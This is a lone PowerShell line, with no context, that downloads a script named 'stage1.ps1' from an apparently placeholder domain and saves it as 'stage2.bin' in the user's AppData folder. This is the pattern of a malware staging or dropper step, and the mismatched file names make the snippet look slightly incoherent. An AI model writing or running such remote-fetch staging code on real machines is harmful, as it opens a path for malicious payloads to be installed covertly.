
try { Invoke-WebRequest -Uri "https://adatum.com/stage1.ps1" -OutFile "$env:APPDATA\stage2.bin" -UseBasicParsing; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
